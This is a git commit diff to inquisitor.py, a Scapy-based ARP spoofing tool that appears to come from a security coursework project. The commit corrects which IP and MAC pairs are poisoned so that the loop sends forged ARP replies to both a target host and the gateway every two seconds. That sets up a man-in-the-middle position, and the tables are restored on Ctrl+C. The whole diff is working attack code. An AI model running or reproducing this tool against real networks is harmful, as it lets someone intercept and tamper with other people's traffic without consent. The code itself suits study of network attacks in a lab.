1cdf4c851baa103973fec2430ec1b8c58bfe4372
Massilia <massblri@gmail.com>
2024-01-24 21:35:58 +0100

    update spoof

--- inquisitor/inquisitor.py
+++ inquisitor/inquisitor.py
@@ -21,9 +21,9 @@ def checkMac(ip: str, mac: str):
             else:
                 return 0
 
-def poisoning(target_ip, spoof_ip, target_mac):
-# Will change ARP table on target host. Router Mac address will be replaced
-    packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
+def poisoning(target_ip, spoof_ip, mac):
+# change mac adress in arp table on target_ip
+    packet = ARP(pdst=target_ip, hwdst=mac, psrc=spoof_ip, op=2)
     send(packet, verbose=0)
 
 def restore(target_ip, spoof_ip, mac1, mac2):
@@ -37,15 +37,10 @@ def scan(ip): # requete arp pour recuperer l'adresse mac de l'hote
     
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, #recuperer les reponses
                                 verbose=False)[0]
-    clients_list = []
-    for element in answered_list:
-        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        clients_list.append(client_dict)
     print("IP\t\t\tMAC Address")
     print("----------------------------------------------------")
-    for client in clients_list:
-        print(client["ip"] + "\t\t" + client["mac"])
-    return clients_list
+    for element in answered_list:
+        print(element[1].psrc + "\t\t" + element[1].hwsrc)
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
@@ -54,8 +49,8 @@ def parse_arguments():
     parser.add_argument("-s", "--scan", dest="scan_ip", help="Scan IP")
 
     # Ajoutez les arguments pour <IP-src> <MAC-src> <IP-target> <MAC-target>
-    parser.add_argument("ip_src", nargs="?", help="Source IP")
-    parser.add_argument("mac_src", nargs="?", help="Source MAC")
+    parser.add_argument("ip_gtw", nargs="?", help="Gateway IP")
+    parser.add_argument("mac_gtw", nargs="?", help="Gateway MAC")
     parser.add_argument("ip_target", nargs="?", help="Target IP")
     parser.add_argument("mac_target", nargs="?", help="Target MAC")
 
@@ -66,14 +61,14 @@ def main():
     if args.scan_ip:
         scan(args.scan_ip)
         sys.exit(1)
-    elif any(arg is None for arg in [args.ip_src, args.mac_src, args.ip_target, args.mac_target]):
+    elif any(arg is None for arg in [args.ip_gtw, args.mac_gtw, args.ip_target, args.mac_target]):
         print("Error: you must provide these 4 parameters : <IP-src> <MAC-src> <IP-target> <MAC-target> or use -s or --scan'")
         sys.exit(1)
 
-    if not checkipv4(args.ip_src) or not checkipv4(args.ip_target):
+    if not checkipv4(args.ip_gtw) or not checkipv4(args.ip_target):
         print("Error: you must provide valid IPv4 addresses")
         sys.exit(1)
-    if not checkMac(args.ip_src, args.mac_src) or not checkMac(args.ip_target, args.mac_target):
+    if not checkMac(args.ip_gtw, args.mac_gtw) or not checkMac(args.ip_target, args.mac_target):
         print("Error: invalid Mac address. Use -s or --scan.")
         sys.exit(1)
 
@@ -81,15 +76,15 @@ def main():
     try:
         while True:
             print("Starting poisoning..")
-            poisoning(args.ip_src, args.ip_target, args.mac_src) # First time to update target arp table
-            poisoning(args.ip_target, args.ip_src, args.mac_target) # Second time to update router arp table
+            poisoning(args.ip_target, args.ip_gtw, args.mac_target) # First time to update target arp table
+            poisoning(args.ip_gtw, args.ip_target, args.mac_gtw)  # Second time to update router arp table
             sent_packets_count +=2
             print(f"\r[+] Packets sent: {sent_packets_count}", end="")
             time.sleep(2)
     except KeyboardInterrupt:
         print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
-        restore(args.ip_src, args.ip_target, args.mac_src)
-        restore(args.ip_target, args.ip_src, args.mac_target)
+        restore(args.ip_gtw, args.ip_target, args.mac_gtw)
+        restore(args.ip_target, args.ip_gtw, args.mac_target)
 
 if __name__ == "__main__":
     main()
